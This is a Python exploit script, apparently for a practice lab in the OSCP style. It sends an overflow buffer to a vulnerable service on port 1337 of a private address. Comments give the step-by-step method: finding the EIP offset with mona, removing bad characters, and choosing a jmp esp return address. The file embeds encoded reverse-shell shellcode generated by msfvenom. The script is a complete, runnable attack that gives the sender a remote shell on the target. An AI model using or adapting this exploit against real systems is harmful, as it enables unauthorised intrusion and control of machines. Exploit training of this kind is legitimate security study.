import socket

ip = "10.10.3.54"
port = 1337

prefix = "OVERFLOW5 "

# Default offset value
# offset = 0

# Step 2
# Set offset for EIP reg
# !mona findmsp -distance 500
offset = 314

overflow = "A" * offset

# Default retn
# retn = ""

# Step 2
# set test value
# retn = "BBBB"

# Step 5
# set return reg address in backword format
# get address with mona
# !mona jmp -r esp -cpb "\x00<other_badcodes>"
retn = "\xaf\x11\x50\x62"

# Defaul padding value
# padding = ""

# Step 5
# Add space to unpack payload
padding = "\x90" * 16

# Step 1
# Set payload for buffer overflowing (length <custom_length>)
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1700
# payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

# Step 2
# set empty payload
# payload = ""

# Step 3
# Set payload chars without \x00 to find other badchars
# !mona bytearray -b "\x00"
# !mona compare -f C:\mona\oscp\bytearray.bin -a 018CFA30
# !mona compare -f C:\mona\oscp\bytearray.bin -a <ESP reg address>
# payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# Step 4
# Set payload chars without badchars
# payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfe\xff"

# Step 5
# Set shell payload
# msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
payload = ("\xfc\xbb\xf0\x4d\x8e\xb8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x0c\xa5\x0c\xb8\xec"
"\x36\x71\x30\x09\x07\xb1\x26\x5a\x38\x01\x2c\x0e\xb5\xea\x60"
"\xba\x4e\x9e\xac\xcd\xe7\x15\x8b\xe0\xf8\x06\xef\x63\x7b\x55"
"\x3c\x43\x42\x96\x31\x82\x83\xcb\xb8\xd6\x5c\x87\x6f\xc6\xe9"
"\xdd\xb3\x6d\xa1\xf0\xb3\x92\x72\xf2\x92\x05\x08\xad\x34\xa4"
"\xdd\xc5\x7c\xbe\x02\xe3\x37\x35\xf0\x9f\xc9\x9f\xc8\x60\x65"
"\xde\xe4\x92\x77\x27\xc2\x4c\x02\x51\x30\xf0\x15\xa6\x4a\x2e"
"\x93\x3c\xec\xa5\x03\x98\x0c\x69\xd5\x6b\x02\xc6\x91\x33\x07"
"\xd9\x76\x48\x33\x52\x79\x9e\xb5\x20\x5e\x3a\x9d\xf3\xff\x1b"
"\x7b\x55\xff\x7b\x24\x0a\xa5\xf0\xc9\x5f\xd4\x5b\x86\xac\xd5"
"\x63\x56\xbb\x6e\x10\x64\x64\xc5\xbe\xc4\xed\xc3\x39\x2a\xc4"
"\xb4\xd5\xd5\xe7\xc4\xfc\x11\xb3\x94\x96\xb0\xbc\x7e\x66\x3c"
"\x69\xd0\x36\x92\xc2\x91\xe6\x52\xb3\x79\xec\x5c\xec\x9a\x0f"
"\xb7\x85\x31\xea\x50\xa0\xcc\xfe\x99\xdc\xcc\xfe\xcc\x31\x58"
"\x18\x84\x59\x0c\xb3\x31\xc3\x15\x4f\xa3\x0c\x80\x2a\xe3\x87"
"\x27\xcb\xaa\x6f\x4d\xdf\x5b\x80\x18\xbd\xca\x9f\xb6\xa9\x91"
"\x32\x5d\x29\xdf\x2e\xca\x7e\x88\x81\x03\xea\x24\xbb\xbd\x08"
"\xb5\x5d\x85\x88\x62\x9e\x08\x11\xe6\x9a\x2e\x01\x3e\x22\x6b"
"\x75\xee\x75\x25\x23\x48\x2c\x87\x9d\x02\x83\x41\x49\xd2\xef"
"\x51\x0f\xdb\x25\x24\xef\x6a\x90\x71\x10\x42\x74\x76\x69\xbe"
"\xe4\x79\xa0\x7a\x04\x98\x60\x77\xad\x05\xe1\x3a\xb0\xb5\xdc"
"\x79\xcd\x35\xd4\x01\x2a\x25\x9d\x04\x76\xe1\x4e\x75\xe7\x84"
"\x70\x2a\x08\x8d\x70\xcc\xf6\x2e")


postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
